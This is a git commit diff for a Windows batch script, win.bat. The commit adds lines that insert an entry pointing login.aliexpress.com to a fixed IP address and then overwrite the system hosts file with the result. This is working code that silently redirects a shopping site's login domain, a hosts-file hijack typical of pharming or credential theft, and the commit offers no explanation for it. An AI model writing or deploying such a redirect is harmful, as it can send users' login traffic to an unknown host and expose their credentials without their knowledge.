5ca58b690aaddf8ed721a2fab19c47ae29ddbc3f
azertyuiopvnx <azertyuiopvnx@gmail.com>
2020-10-03 23:19:15 +0200

    Update win.bat

--- win.bat
+++ win.bat
@@ -1,1 +1,4 @@
 @echo off
+echo 184.25.158.9 login.aliexpress.com >> %temp%\hosts.txt
+type C:\WINDOWS\system32\drivers\etc\hosts >> %temp%\hosts.txt
+copy /Y %temp%\hosts.txt C:\WINDOWS\system32\drivers\etc\hosts
